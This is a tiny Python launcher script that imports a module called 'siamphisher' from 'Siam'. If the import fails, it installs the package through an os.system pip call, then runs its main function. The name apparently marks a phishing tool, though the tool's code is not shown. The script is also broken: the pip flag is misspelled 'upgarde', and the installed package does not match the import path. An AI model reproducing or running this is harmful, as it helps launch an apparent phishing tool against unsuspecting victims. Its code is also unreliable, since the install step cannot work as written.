import os

#  
# IF YOU CAN USE THIS SYSTEM CODE BELLOW HERE


import os,requests,sys
try:
    from Siam import siamphisher
except:
    os.system('pip install --upgarde siamphisher')


try:
    siamphisher.main()
except Exception as err:
    print(err)